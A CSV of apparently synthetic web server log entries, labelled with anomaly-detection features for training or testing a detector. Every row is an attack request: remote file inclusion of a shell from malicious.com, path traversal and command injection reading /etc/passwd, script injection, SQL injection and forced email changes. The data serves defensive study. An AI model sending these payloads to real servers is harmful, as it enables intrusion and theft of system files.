ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
114.192.201.64,2025-03-15 12:12:32,POST /change-email?email=attacker@example.com HTTP/1.1,200,4579,1.4103519335503996,False,54,200,True,True
216.101.135.168,2025-03-15 12:12:56,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,972,-1.3591827325534476,False,59,200,True,True
64.29.13.155,2025-03-15 12:12:11,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4555,1.3919242008122537,False,51,403,True,True
241.126.41.83,2025-03-15 12:12:44,POST /upload-xml HTTP/1.1,403,4991,1.726694678888571,False,25,403,True,True
212.104.194.56,2025-03-15 12:12:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1546,-0.9184527912327911,False,60,200,True,True
129.16.147.36,2025-03-15 12:12:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,615,-1.6332952570333683,False,60,200,True,True
81.248.87.82,2025-03-15 12:12:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,1048,-1.300828245549319,False,54,200,True,True
168.37.246.193,2025-03-15 12:12:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3145,0.3092949024461808,False,60,200,True,True
96.38.0.52,2025-03-15 12:13:04,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4426,1.2928751373447194,False,59,200,True,True
147.194.27.51,2025-03-15 12:12:34,GET /admin HTTP/1.1,403,705,-1.564191259265321,False,19,403,True,True
156.20.94.41,2025-03-15 12:12:12,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,629,-1.6225457462694497,False,59,200,True,True
73.224.141.202,2025-03-15 12:12:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,634,-1.618706635282336,False,51,403,True,True
166.78.195.78,2025-03-15 12:12:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,616,-1.6325274348359455,False,51,403,True,True
7.8.101.48,2025-03-15 12:12:26,POST /change-email?email=attacker@example.com HTTP/1.1,200,4676,1.484830686700406,False,54,200,True,True
161.83.26.20,2025-03-15 12:12:08,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,901,-1.4136981085704627,False,59,200,True,True
25.94.38.192,2025-03-15 12:12:20,POST /change-email?email=attacker@example.com HTTP/1.1,200,974,-1.3576470881586022,False,54,200,True,True
57.203.28.221,2025-03-15 12:12:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,574,-1.664775967127701,False,47,403,True,True
215.156.67.29,2025-03-15 12:12:50,GET /admin HTTP/1.1,403,4773,1.5593094398504124,False,19,403,True,True
234.130.248.193,2025-03-15 12:12:48,POST /change-email?email=attacker@example.com HTTP/1.1,200,989,-1.3461297551972609,False,54,200,True,True
54.233.175.74,2025-03-15 12:12:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4779,1.5639163730349488,False,47,403,True,True
245.60.227.191,2025-03-15 12:12:16,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4898,1.6552872145282558,False,47,403,True,True
253.21.112.229,2025-03-15 12:13:00,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,710,-1.5603521482782072,False,51,403,True,True
40.15.15.25,2025-03-15 12:12:34,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4635,1.4533499766060733,False,51,403,True,True
25.209.5.8,2025-03-15 12:12:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3326,0.448270720179698,False,60,200,True,True
146.157.26.164,2025-03-15 12:13:05,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,771,-1.5135149942354198,False,59,200,True,True
76.178.183.29,2025-03-15 12:12:38,POST /change-email?email=attacker@example.com HTTP/1.1,200,956,-1.3714678877122115,False,54,200,True,True
239.126.198.17,2025-03-15 12:12:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,912,-1.4052520643988125,False,60,200,True,True
28.105.117.32,2025-03-15 12:13:06,GET /admin HTTP/1.1,403,4733,1.5285965519535025,False,19,403,True,True
28.172.130.93,2025-03-15 12:12:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1405,-1.0267157210693985,False,60,200,True,True
180.203.237.26,2025-03-15 12:12:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,4736,1.5309000185457708,False,54,200,True,True
222.166.239.239,2025-03-15 12:12:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4848,1.6168961046571184,False,59,200,True,True
199.188.171.91,2025-03-15 12:12:51,POST /change-email?email=attacker@example.com HTTP/1.1,200,1231,-1.1603167834209562,False,54,200,True,True
214.141.46.114,2025-03-15 12:13:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1567,-0.9023285250869134,False,60,200,True,True
198.22.119.248,2025-03-15 12:12:41,GET /execute?cmd=whoami HTTP/1.1,403,573,-1.6655437893251235,False,32,403,True,True
188.124.176.234,2025-03-15 12:13:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3471,0.5596049388059963,False,60,200,True,True
70.214.21.53,2025-03-15 12:12:55,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,582,-1.6586333895483187,False,59,200,True,True
160.15.118.187,2025-03-15 12:12:41,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3741,0.7669169321101378,False,60,200,True,True
119.131.149.129,2025-03-15 12:12:32,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3234,0.3776310780168053,False,60,200,True,True
18.193.96.180,2025-03-15 12:12:52,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4892,1.6506802813437191,False,51,403,True,True
173.154.237.231,2025-03-15 12:12:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1717,-0.7871551954735014,False,60,200,True,True
26.218.52.153,2025-03-15 12:12:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1277,-1.12499696233951,False,60,200,True,True
118.121.204.138,2025-03-15 12:12:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1034,-1.3115777563132374,False,60,200,True,True
214.122.194.34,2025-03-15 12:12:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,867,-1.439804063282836,False,60,200,True,True
13.232.212.215,2025-03-15 12:12:29,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4890,1.6491446369488738,False,60,200,True,True
195.148.241.171,2025-03-15 12:12:55,POST /change-email?email=attacker@example.com HTTP/1.1,200,4517,1.3627469573101891,False,54,200,True,True
211.254.153.139,2025-03-15 12:12:23,POST /change-email?email=attacker@example.com HTTP/1.1,200,4112,1.0517789673539768,False,54,200,True,True
29.115.217.154,2025-03-15 12:12:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1222,-1.167227183197761,False,59,200,True,True
206.5.201.64,2025-03-15 12:13:07,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4880,1.6414664149746463,False,59,200,True,True
221.234.253.113,2025-03-15 12:12:34,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4470,1.32665931403132,False,59,200,True,True
244.20.100.252,2025-03-15 12:12:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1407,-1.025180076674553,False,60,200,True,True
208.197.204.209,2025-03-15 12:12:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,866,-1.4405718854802587,False,60,200,True,True
56.236.153.88,2025-03-15 12:13:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4357,1.2398954057225497,False,60,200,True,True
105.107.0.101,2025-03-15 12:12:53,POST /change-email?email=attacker@example.com HTTP/1.1,200,4516,1.3619791351127666,False,54,200,True,True
113.27.252.133,2025-03-15 12:12:38,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4468,1.3251236696364745,False,59,200,True,True
153.183.92.20,2025-03-15 12:13:01,POST /upload-xml HTTP/1.1,403,602,-1.643276945599864,False,25,403,True,True
190.142.70.94,2025-03-15 12:13:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3327,0.4490385423771207,False,60,200,True,True
59.246.39.39,2025-03-15 12:13:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,563,-1.673222011299351,False,60,200,True,True
19.153.230.124,2025-03-15 12:12:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4671,1.4809915757132923,False,59,200,True,True
224.108.162.101,2025-03-15 12:13:10,POST /change-email?email=attacker@example.com HTTP/1.1,200,4987,1.7236233900988802,False,54,200,True,True
253.157.225.182,2025-03-15 12:12:35,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,765,-1.5181219274199562,False,51,403,True,True
198.172.16.155,2025-03-15 12:12:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,760,-1.5219610384070699,False,60,200,True,True
232.16.163.31,2025-03-15 12:12:38,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4731,1.527060907558657,False,47,403,True,True
161.224.69.64,2025-03-15 12:12:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4787,1.5700589506143308,False,60,200,True,True
88.168.255.14,2025-03-15 12:12:39,GET /admin HTTP/1.1,403,759,-1.5227288606044926,False,19,403,True,True
51.175.41.151,2025-03-15 12:12:20,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4718,1.5170792189921614,False,51,403,True,True
54.210.215.91,2025-03-15 12:12:44,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4357,1.2398954057225497,False,51,403,True,True
168.26.63.253,2025-03-15 12:12:26,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4815,1.5915579721421678,False,59,200,True,True
121.20.75.233,2025-03-15 12:13:09,GET /search?q=' OR '1'='1 HTTP/1.1,403,623,-1.6271526794539863,False,34,403,True,True
137.18.113.217,2025-03-15 12:12:30,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,762,-1.5204253940122245,False,51,403,True,True
64.108.2.143,2025-03-15 12:12:31,POST /change-email?email=attacker@example.com HTTP/1.1,200,3965,0.938909104332833,False,54,200,True,True
115.225.15.162,2025-03-15 12:12:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4917,1.6698758362792878,False,60,200,True,True
209.70.35.212,2025-03-15 12:13:08,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,776,-1.509675883248306,False,47,403,True,True
94.57.83.203,2025-03-15 12:12:48,GET /admin HTTP/1.1,403,717,-1.554977392896248,False,19,403,True,True
172.85.85.91,2025-03-15 12:13:20,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4975,1.7144095237298071,False,47,403,True,True
216.228.127.188,2025-03-15 12:12:56,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4951,1.6959817909916612,False,47,403,True,True
49.74.87.227,2025-03-15 12:13:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,655,-1.6025823691364582,False,59,200,True,True
94.213.70.26,2025-03-15 12:13:12,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4957,1.7005887241761977,False,47,403,True,True
156.73.156.239,2025-03-15 12:13:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4661,1.4733133537390648,False,51,403,True,True
56.31.239.128,2025-03-15 12:13:12,POST /wp-json/wp/v2/users HTTP/1.1,403,531,-1.6977923216168789,False,34,403,True,True
192.179.178.136,2025-03-15 12:12:58,POST /change-email?email=attacker@example.com HTTP/1.1,200,4366,1.2468058054993545,False,54,200,True,True
32.182.30.97,2025-03-15 12:12:45,POST /change-email?email=attacker@example.com HTTP/1.1,200,4560,1.3957633117993673,False,54,200,True,True
30.4.178.190,2025-03-15 12:12:50,POST /upload-xml HTTP/1.1,403,525,-1.7023992548014153,False,25,403,True,True
45.185.158.139,2025-03-15 12:13:06,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3807,0.8175931971400391,False,60,200,True,True
108.78.108.126,2025-03-15 12:13:17,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1218,-1.170298471987452,False,59,200,True,True
221.204.213.64,2025-03-15 12:12:58,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,818,-1.4774273509565505,False,51,403,True,True
82.19.99.210,2025-03-15 12:13:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4560,1.3957633117993673,False,51,403,True,True
216.20.205.25,2025-03-15 12:12:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,758,-1.5234966828019154,False,51,403,True,True
143.17.202.37,2025-03-15 12:13:16,POST /change-email?email=attacker@example.com HTTP/1.1,200,4923,1.6744827694638245,False,54,200,True,True
105.168.78.93,2025-03-15 12:13:08,GET /execute?cmd=whoami HTTP/1.1,403,4999,1.732837256467953,False,32,403,True,True
156.211.110.191,2025-03-15 12:13:23,POST /change-email?email=attacker@example.com HTTP/1.1,200,976,-1.3561114437637567,False,54,200,True,True
175.10.132.176,2025-03-15 12:12:30,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1114,-1.2501519805194177,False,60,200,True,True
6.26.231.32,2025-03-15 12:13:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2911,0.1296245082492581,False,60,200,True,True
157.134.193.131,2025-03-15 12:12:54,GET /admin HTTP/1.1,403,4945,1.6913748578071248,False,19,403,True,True
41.83.88.6,2025-03-15 12:13:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,501,-1.7208269875395614,False,60,200,True,True
124.227.203.64,2025-03-15 12:12:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1499,-0.9545404345116602,False,60,200,True,True
68.56.71.115,2025-03-15 12:12:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3005,0.20179979480699628,False,60,200,True,True
45.56.118.149,2025-03-15 12:13:11,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,599,-1.6455804121921322,False,47,403,True,True
87.242.204.73,2025-03-15 12:12:48,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,722,-1.5511382819091344,False,51,403,True,True
167.23.172.187,2025-03-15 12:12:41,GET /execute?cmd=whoami HTTP/1.1,403,611,-1.6363665458230592,False,32,403,True,True
7.187.185.84,2025-03-15 12:13:27,POST /change-email?email=attacker@example.com HTTP/1.1,200,4636,1.4541177988034961,False,54,200,True,True
209.232.30.180,2025-03-15 12:13:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4763,1.5516312178761849,False,60,200,True,True
102.241.42.27,2025-03-15 12:13:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,828,-1.4697491289823232,False,54,200,True,True
15.11.149.21,2025-03-15 12:13:26,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4968,1.709034768347848,False,47,403,True,True
20.123.37.70,2025-03-15 12:12:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4799,1.5792728169834038,False,47,403,True,True
235.95.200.53,2025-03-15 12:13:27,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1247,-1.1480316282621923,False,60,200,True,True
230.36.145.158,2025-03-15 12:12:36,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1005,-1.333844600038497,False,59,200,True,True
167.68.92.186,2025-03-15 12:13:13,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,691,-1.5749407700292395,False,51,403,True,True
166.97.135.241,2025-03-15 12:13:20,GET /admin HTTP/1.1,403,4565,1.3996024227864812,False,19,403,True,True
19.229.170.92,2025-03-15 12:12:44,POST /change-email?email=attacker@example.com HTTP/1.1,200,4528,1.3711930014818394,False,54,200,True,True
218.81.102.59,2025-03-15 12:13:06,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4729,1.5255252631638114,False,59,200,True,True
119.221.168.137,2025-03-15 12:13:10,GET /admin HTTP/1.1,403,633,-1.6194744574797588,False,19,403,True,True
24.232.242.139,2025-03-15 12:13:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4695,1.4994193084514382,False,47,403,True,True
225.82.227.18,2025-03-15 12:12:42,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3747,0.7715238652946743,False,60,200,True,True
90.187.80.145,2025-03-15 12:13:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,690,-1.5757085922266623,False,54,200,True,True
198.28.29.53,2025-03-15 12:12:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4216,1.1316324758859424,False,60,200,True,True
65.148.150.198,2025-03-15 12:13:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,695,-1.5718694812395484,False,47,403,True,True
183.12.249.66,2025-03-15 12:12:41,GET /admin HTTP/1.1,403,4612,1.4356900660653502,False,19,403,True,True
232.52.97.37,2025-03-15 12:13:08,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4492,1.3435514023746205,False,60,200,True,True
25.15.195.219,2025-03-15 12:12:53,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4213,1.1293290092936743,False,60,200,True,True
25.136.37.80,2025-03-15 12:13:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4806,1.584647572365363,False,51,403,True,True
152.145.59.167,2025-03-15 12:12:57,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,763,-1.5196575718148018,False,51,403,True,True
223.236.53.217,2025-03-15 12:12:36,GET /admin HTTP/1.1,403,737,-1.5396209489477932,False,19,403,True,True
224.157.64.77,2025-03-15 12:12:35,POST /upload-xml HTTP/1.1,403,4952,1.696749613189084,False,25,403,True,True
240.115.112.35,2025-03-15 12:12:56,GET /admin HTTP/1.1,403,616,-1.6325274348359455,False,19,403,True,True
219.187.242.121,2025-03-15 12:12:57,GET /execute?cmd=whoami HTTP/1.1,403,542,-1.6893462774452288,False,32,403,True,True
120.26.41.67,2025-03-15 12:12:39,GET /admin HTTP/1.1,403,546,-1.6862749886555377,False,19,403,True,True
244.220.242.35,2025-03-15 12:13:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3419,0.5196781845400134,False,60,200,True,True
237.34.239.126,2025-03-15 12:13:17,GET /search?q=' OR '1'='1 HTTP/1.1,403,5000,1.7336050786653758,False,34,403,True,True
8.147.54.219,2025-03-15 12:13:00,GET /execute?cmd=whoami HTTP/1.1,403,4993,1.7282303232834166,False,32,403,True,True
63.72.188.133,2025-03-15 12:13:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,910,-1.406787708793658,False,60,200,True,True
97.120.87.176,2025-03-15 12:13:03,POST /change-email?email=attacker@example.com HTTP/1.1,200,1045,-1.303131712141587,False,54,200,True,True
15.204.52.5,2025-03-15 12:12:48,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4031,0.9895853693627343,False,60,200,True,True
170.127.108.130,2025-03-15 12:13:25,POST /wp-json/wp/v2/users HTTP/1.1,403,637,-1.6164031686900677,False,34,403,True,True
65.90.24.215,2025-03-15 12:13:22,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1059,-1.2923822013776687,False,60,200,True,True
125.178.252.196,2025-03-15 12:13:05,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4397,1.2706082936194596,False,47,403,True,True
162.248.232.193,2025-03-15 12:12:42,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,511,-1.713148765565334,False,51,403,True,True
254.33.184.174,2025-03-15 12:13:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3111,0.28318894773380743,False,60,200,True,True
187.16.133.107,2025-03-15 12:12:52,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,868,-1.4390362410854134,False,59,200,True,True
64.23.181.31,2025-03-15 12:12:55,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,744,-1.5342461935658338,False,59,200,True,True
116.146.110.92,2025-03-15 12:13:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4404,1.2759830490014188,False,60,200,True,True
136.8.10.85,2025-03-15 12:13:00,GET /execute?cmd=whoami HTTP/1.1,403,517,-1.7085418323807975,False,32,403,True,True
89.12.116.249,2025-03-15 12:13:32,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,881,-1.4290545525189176,False,59,200,True,True
106.186.8.49,2025-03-15 12:12:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1668,-0.824778483147216,False,60,200,True,True
104.189.188.232,2025-03-15 12:12:50,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,567,-1.6701507225096601,False,47,403,True,True
37.48.122.3,2025-03-15 12:13:22,POST /change-email?email=attacker@example.com HTTP/1.1,200,4179,1.1032230545813009,False,54,200,True,True
25.182.196.162,2025-03-15 12:13:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1459,-0.98525332240857,False,60,200,True,True
83.178.94.21,2025-03-15 12:13:21,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,692,-1.5741729478318167,False,51,403,True,True
249.83.213.90,2025-03-15 12:13:41,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,983,-1.3507366883817975,False,51,403,True,True
74.242.166.203,2025-03-15 12:12:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1326,-1.0873736746657954,False,60,200,True,True
221.183.88.76,2025-03-15 12:13:04,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4790,1.572362417206599,False,47,403,True,True
17.3.40.155,2025-03-15 12:12:47,GET /admin HTTP/1.1,403,696,-1.5711016590421256,False,19,403,True,True
97.152.246.120,2025-03-15 12:12:54,GET /execute?cmd=whoami HTTP/1.1,403,569,-1.6686150781148146,False,32,403,True,True
167.100.220.59,2025-03-15 12:13:17,POST /wp-json/wp/v2/users HTTP/1.1,403,545,-1.6870428108529605,False,34,403,True,True
55.199.212.163,2025-03-15 12:13:26,GET /execute?cmd=whoami HTTP/1.1,403,502,-1.7200591653421387,False,32,403,True,True
203.168.110.221,2025-03-15 12:12:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3207,0.3568998786863911,False,60,200,True,True
28.249.140.45,2025-03-15 12:13:00,GET /admin HTTP/1.1,403,4999,1.732837256467953,False,19,403,True,True
63.16.70.162,2025-03-15 12:13:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,786,-1.5019976612740786,False,60,200,True,True
155.6.47.6,2025-03-15 12:13:00,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,605,-1.6409734790075956,False,51,403,True,True
195.169.154.127,2025-03-15 12:12:44,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,704,-1.5649590814627437,False,47,403,True,True
93.250.6.147,2025-03-15 12:13:33,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2901,0.12194628627503064,False,60,200,True,True
51.114.65.228,2025-03-15 12:13:14,GET /execute?cmd=whoami HTTP/1.1,403,5000,1.7336050786653758,False,32,403,True,True
165.98.177.97,2025-03-15 12:12:59,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4808,1.5861832167602086,False,59,200,True,True
135.99.169.106,2025-03-15 12:12:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4740,1.5339713073354617,False,60,200,True,True
16.104.161.106,2025-03-15 12:13:02,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4489,1.3412479357823524,False,59,200,True,True
147.229.228.197,2025-03-15 12:13:38,POST /change-email?email=attacker@example.com HTTP/1.1,200,4039,0.9957279469421163,False,54,200,True,True
152.241.102.95,2025-03-15 12:13:29,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3844,0.8460026184446807,False,60,200,True,True
146.226.216.196,2025-03-15 12:13:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,4297,1.1938260738771849,False,54,200,True,True
131.50.178.252,2025-03-15 12:13:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4590,1.4187979777220496,False,60,200,True,True
151.111.248.74,2025-03-15 12:13:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4368,1.2483414498942,False,60,200,True,True
201.31.2.239,2025-03-15 12:12:52,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4856,1.6230386822365004,False,59,200,True,True
242.128.2.105,2025-03-15 12:13:11,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3481,0.5672831607802237,False,60,200,True,True
174.148.138.74,2025-03-15 12:13:09,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1052,-1.2977569567596279,False,59,200,True,True
130.78.245.167,2025-03-15 12:13:40,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4592,1.4203336221168952,False,47,403,True,True
69.113.57.10,2025-03-15 12:13:20,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1000,-1.3376837110256108,False,51,403,True,True
174.225.26.121,2025-03-15 12:12:57,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,554,-1.6801324110761557,False,60,200,True,True
24.225.41.93,2025-03-15 12:13:32,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4553,1.390388556417408,False,47,403,True,True
167.174.67.147,2025-03-15 12:13:29,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,950,-1.3760748208967482,False,59,200,True,True
186.226.183.135,2025-03-15 12:12:51,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4643,1.4594925541854553,False,51,403,True,True
79.65.186.59,2025-03-15 12:13:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4462,1.3205167364519381,False,60,200,True,True
130.19.161.111,2025-03-15 12:12:48,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3535,0.608745559441052,False,60,200,True,True
168.128.68.166,2025-03-15 12:13:26,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4559,1.3949954896019445,False,59,200,True,True
247.253.184.68,2025-03-15 12:13:23,GET /admin HTTP/1.1,403,697,-1.570333836844703,False,19,403,True,True
14.213.229.135,2025-03-15 12:12:52,GET /execute?cmd=whoami HTTP/1.1,403,568,-1.6693829003122373,False,32,403,True,True
44.123.86.15,2025-03-15 12:13:07,POST /upload-xml HTTP/1.1,403,525,-1.7023992548014153,False,25,403,True,True
244.90.206.227,2025-03-15 12:13:46,GET /admin HTTP/1.1,403,4630,1.4495108656189597,False,19,403,True,True
158.179.147.209,2025-03-15 12:12:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4628,1.4479752212241142,False,47,403,True,True
94.108.168.146,2025-03-15 12:13:29,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,681,-1.582618992003467,False,47,403,True,True
131.89.197.60,2025-03-15 12:13:25,GET /execute?cmd=whoami HTTP/1.1,403,544,-1.6878106330503833,False,32,403,True,True
196.86.242.200,2025-03-15 12:13:05,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3375,0.4858940078534126,False,60,200,True,True
3.166.117.253,2025-03-15 12:13:25,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,655,-1.6025823691364582,False,47,403,True,True
184.43.103.18,2025-03-15 12:13:41,POST /change-email?email=attacker@example.com HTTP/1.1,200,4233,1.1446854532421291,False,54,200,True,True
